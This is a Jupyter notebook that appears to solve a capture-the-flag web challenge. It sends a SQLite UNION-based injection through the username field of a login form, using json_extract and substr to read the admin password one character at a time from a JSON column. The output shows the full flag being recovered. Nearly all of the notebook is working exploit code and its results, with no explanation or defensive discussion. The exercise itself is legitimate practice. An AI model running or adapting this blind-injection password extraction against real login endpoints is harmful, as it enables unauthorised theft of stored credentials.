{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "# username = 'guest'\n",
    "\n",
    "# first five word of password is FLAG{\n",
    "# password = 'FLAG{'\n",
    "# password = chr(70)\n",
    "password = ''\n",
    "# base_password = 'guest'\n",
    "# base_password = '123'\n",
    "\n",
    "\n",
    "def check(username, password):\n",
    "    res = requests.post(\"http://10.113.184.121:10081/login\", data={\"username\": username, \"password\": password}).text\n",
    "    # res = requests.post(\"http://127.0.0.1:3000/login\", data={\"username\": username, \"password\": password}).text\n",
    "    \n",
    "    # print(res)\n",
    "    return res == '<h1>Success!</h1>'\n",
    "\n",
    "# check(username, password)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "F\n",
      "FL\n",
      "FLA\n",
      "FLAG\n",
      "FLAG{\n",
      "FLAG{s\n",
      "FLAG{sq\n",
      "FLAG{sql\n",
      "FLAG{sqli\n",
      "FLAG{sqlit\n",
      "FLAG{sqlite\n",
      "FLAG{sqlite_\n",
      "FLAG{sqlite_j\n",
      "FLAG{sqlite_js\n",
      "FLAG{sqlite_js0\n",
      "FLAG{sqlite_js0n\n",
      "FLAG{sqlite_js0n_\n",
      "FLAG{sqlite_js0n_i\n",
      "FLAG{sqlite_js0n_in\n",
      "FLAG{sqlite_js0n_inj\n",
      "FLAG{sqlite_js0n_inje\n",
      "FLAG{sqlite_js0n_injec\n",
      "FLAG{sqlite_js0n_inject\n",
      "FLAG{sqlite_js0n_inject!\n",
      "FLAG{sqlite_js0n_inject!o\n",
      "FLAG{sqlite_js0n_inject!on\n",
      "FLAG{sqlite_js0n_inject!on}\n"
     ]
    }
   ],
   "source": [
    "def crack(username):\n",
    "    for i in range(128):\n",
    "        res = check(username, chr(i))\n",
    "        if(res == True):\n",
    "            return chr(i)\n",
    "        \n",
    "count = 1 \n",
    "while True:\n",
    "    username = '''admin.password\") AS password FROM db where 1=2 UNION SELECT substr(json_extract(users, '$.admin.password'), '''\n",
    "    username += str(count)\n",
    "    username +=''', 1) FROM db; -- '''\n",
    "\n",
    "    text = crack(username)\n",
    "    password += text\n",
    "    print(password)\n",
    "\n",
    "    if(text == \"}\"):\n",
    "        break\n",
    "    \n",
    "    count += 1\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.12"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
